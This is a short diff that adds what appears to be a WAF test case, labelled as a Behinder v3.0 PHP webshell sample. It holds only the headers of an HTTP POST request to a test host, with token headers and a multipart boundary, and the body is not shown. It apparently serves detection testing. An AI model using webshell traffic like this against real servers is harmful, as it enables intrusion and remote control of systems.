@@ -1,0 +1,10 @@
+# webshell_Behinder_v3.0_Beta_11_t00ls_php
+# Behinder_v3.0_Beta_11 t00ls php 版本的webshell
+POST /?bid=hd_tag_m8mv240v HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv240v
+RM-PRO-Token: 84cf64e6c0be92cfdd122d41b3d47f7f
+RM-PRO-Time: 1742808357176
+User-Agent: curl/7.83.1
+Content-Type: multipart/form-data; boundary=Bt5_BgJyu_R0mVVqLuPmMI98hEASVWut
+
